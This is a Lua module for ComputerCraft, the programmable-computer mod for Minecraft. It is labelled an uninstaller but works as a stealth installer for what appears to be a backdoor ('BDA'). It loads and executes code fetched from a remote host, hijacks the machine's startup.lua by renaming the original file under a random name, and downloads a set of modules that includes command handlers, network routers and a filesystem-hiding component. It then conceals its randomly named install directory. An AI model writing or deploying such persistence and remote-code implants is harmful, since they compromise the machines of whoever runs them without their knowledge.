-- SPDX-FileCopyrightText: 2025 David Lightman
--
-- SPDX-License-Identifier: LicenseRef-CCPL
--Comments:
--[[
    My one liners are souly for 9551's brain rot <3
]]

local uninstaller = {}
uninstaller.__index = uninstaller

local OriginalShell = shell
local OriginalFS = fs
local OriginalInstallDir=nil
local CustomFS = nil
local utils = load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
local configpath = nil

if (utils==nil) then
    print("Utils failed to load, is the server up?")
    return nil
end
local function scan_startup()
    --Checks for my name in comments
    if OriginalFS.exists("startup.lua") then local f=OriginalFS.open("startup.lua","r") local l1,l2,l3=f.readLine(),f.readLine(),f.readLine() f.close() if (l1..l2..l3):find("wget pastebin") then local u=string.match(l1..l2..l3,"pastebin%s+(%S+)") if u then local r=http.get("https://pastebin.com/raw/"..u) if r and r.readAll():find("David Lightman") then return true end end elseif (l1..l2..l3):find("David Lightman") then return true end end
    return false
end


local function getRealStartupPath()
    if not fs.exists("/startup.lua") then return nil end
    local f1 = fs.open("/startup.lua", "r")
    if not f1 then return nil end  -- Safeguard against failed open
    for i = 1, 6 do
        local l = f1.readLine()
        if not l then 
            break
        end
        local filename = string.match(l, "^%-%-(%S+)%.$")
        if filename then
            f1.close()
            return filename
        end
    end
    f1.close()
    return nil
end

local function getBDApath()
    if not fs.exists("/startup.lua") then
        return nil, nil 
    end
    local f = fs.open("/startup.lua", "r")
    if not f then 
        return nil, nil
    end
    for i = 1, 6 do
        local l = f.readLine()
        if not l then 
            break
        end
        local path, filename = string.match(l, "^%-%-(.-),(%S+)$")
        if path and filename then
            f.close()
            return path, filename
        end
    end
    f.close()
    return nil, nil
end

local function detect_installation()
    local flag1,flag2,flag3,flag4 = false,scan_startup(),(getBDApath()~=nil),false
    local crp = OriginalShell.getRunningProgram()
    if (type(crp)=="string" and crp == "startup.lua") then flag1=true end
    if (flag1 or flag2 or flag3 or flag4) then return true end
end

local function uninstall(ogfs, dir)
    if not ogfs.exists(dir) then
        return false
    end

    local items = ogfs.list(dir) -- List all items in the directory
    for _, item in ipairs(items) do
        local path = dir .. "/" .. item
        if ogfs.isDir(path) then
            -- Recursively delete subdirectories
            uninstall(ogfs, path)
        else
            -- Delete files
            ogfs.delete(path)
        end
    end

    -- Delete the now-empty directory
    ogfs.delete(dir)
    return true
end

local function createMetadataFile(mdfn)
    if (mdfn==nil) then print("uninstaller.lua: metadatafilename is nil") end
    local f = OriginalFS.open(mdfn, "w")
    f.close()
    if (configpath~=nil) then utils.addMetadata(OriginalFS, mdfn, "config",configpath,"|") end
end

local function generateRandomString(length)
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = {}
    for i = 1, length do
        local rand = math.random(1, #charset)
        table.insert(result, charset:sub(rand, rand))
    end
    return table.concat(result)
end

local function installer()
    

    local DIR_4Nin92xCdd0 = generateRandomString(8)
    OriginalInstallDir = DIR_4Nin92xCdd0
    local bootfile = generateRandomString(8)
    local metadataFilename = generateRandomString(8) -- Set your metadata filename here
    local randomDelimiter = "^" -- Use a random delimiter for separation
    createMetadataFile(metadataFilename)
    originalStartup = getRealStartupPath()
    oldStartupFileName = generateRandomString(8) -- Does not end with .lua
    if (originalStartup == nil) then
        if (originalStartup == nil) then
            if not OriginalFS.exists(bootfile) then
                -- Rename the existing startup.lua
                if OriginalFS.exists("startup.lua") then
                    OriginalFS.move("startup.lua", oldStartupFileName)
                end
                    local f1 = OriginalFS.open("startup.lua", "w")
                    f1.write([[shell.run("%s")]], bootfile)
                    f1.close()
                local f = OriginalFS.open(bootfile, "w")
                f.write(string.format([[
-- SPDX-FileCopyrightText: 2025 David Lightman
--
-- SPDX-LicenseRef-CCPL
--%s.
--%s,%s
--%s%s%s
local function a1()
    shell.setDir("/")
    term.setCursorPos(1, 1)
    term.clear()
    shell.run("%s")
    shell.run("shell.lua")
    os.shutdown()
end
local function a2()
    shell.setDir("/")
    if fs.exists("%s/%s") then
        shell.run("%s/%s")
    end
    while true do
        sleep(60)
    end
end
parallel.waitForAny(a1, a2)
]], oldStartupFileName, OriginalInstallDir, "init.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "init.lua", OriginalInstallDir, "init.lua"))
                f.close()
            else
                -- If no existing startup.lua, create a placeholder and the new startup.lua
                local f = OriginalFS.open(oldStartupFileName, "w")
                f.close()
                local f = OriginalFS.open("startup.lua", "w")
                f.write(string.format([[
-- SPDX-FileCopyrightText: 2025 David Lightman
--
-- SPDX-LicenseRef-CCPL
--%s.
--%s,%s
--%s%s%s
local function a1()
    shell.setDir("/")
    term.setCursorPos(1, 1)
    term.clear()
    shell.run("%s")
    shell.run("shell.lua")
    os.shutdown()
end
local function a2()
    shell.setDir("/")
    if fs.exists("%s/%s") then
        shell.run("%s/%s")
    end
    while true do
        sleep(60)
    end
end
parallel.waitForAny(a1, a2)
]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua", OriginalInstallDir, "main.lua"))
                f.close()
            end
        end
    end

    local function downloadFile(url, path)
        local response = http.get(url, {["User-Agent"] = "ComputerCraft-BDA-Client"})
        if response then
            local file = OriginalFS.open(path, "w")
            file.write(response.readAll())
            file.close()
            response.close()
            print("File downloaded successfully to " .. path)
        else
            print("Failed to download file from " .. url)
        end
    end

    downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", "/" .. DIR_4Nin92xCdd0 .. "/hooks/eventhook.lua")
    downloadFile("https://mydevbox.cc/src/networking/http/http.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/http/http.lua")
    downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", "/" .. DIR_4Nin92xCdd0 .. "/modules/persistent/hide_fs.lua")
    downloadFile("https://mydevbox.cc/src/hooks/custompairs.lua", "/" .. DIR_4Nin92xCdd0 .. "/hooks/custompairs.lua")
    downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", "/" .. DIR_4Nin92xCdd0 .. "/eventhandler/eventhandler.lua")
    downloadFile("https://mydevbox.cc/src/config/config.lua", "/" .. DIR_4Nin92xCdd0 .. "/config/config.lua")
    downloadFile("https://mydevbox.cc/src/sys/utils/utils.lua", "/" .. DIR_4Nin92xCdd0 .. "/sys/utils/utils.lua")
    downloadFile("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", "/" .. DIR_4Nin92xCdd0 .. "/sys/crypto/cc_rsa.lua")
    downloadFile("https://mydevbox.cc/src/networking/http/wsrouter.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/http/wsrouter.lua")
    downloadFile("https://mydevbox.cc/src/networking/rednet/router.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/rednet/router.lua")
    downloadFile("https://mydevbox.cc/src/networking/core_router.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/core_router.lua")
    downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", "/" .. DIR_4Nin92xCdd0 .. "/sys/crypto/EnD.lua")
    downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/processor/command_handler.lua")
    downloadFile("https://mydevbox.cc/src/uninstaller.lua", "/" .. DIR_4Nin92xCdd0 .. "/uninstaller.lua")
    downloadFile("https://mydevbox.cc/src/main.lua", "/" .. DIR_4Nin92xCdd0 .. "/main.lua")
    downloadFile("https://mydevbox.cc/src/init.lua", "/" .. DIR_4Nin92xCdd0 .. "/init.lua")
    if (CustomFS ~= nil) then
        CustomFS.hideDir(DIR_4Nin92xCdd0)
    end
end

function uninstaller.uninstall(ogfs, dir)
    uninstall(ogfs, dir)
end

function uninstaller.installer()
    installer()
end

function uninstaller.setOGShell(s)
    if ((s~=nil) and (type(s)=="table")) then OriginalShell = s end
end

function uninstaller.setOGFS(fs1)
    if ((fs1~=nil) and (type(fs1)=="table")) then OriginalFS = fs1 end
end
function uninstaller.setCFS(fs2)
    if ((fs2~=nil) and (type(fs2)=="table")) then CustomFS = fs2 end
end
function uninstaller.getInstallDir()
    return OriginalInstallDir
end
function uninstaller.setConfigPath(cp)
    if ((cp~=nil) and (type(cp)=="string")) then configpath = cp end
end
return uninstaller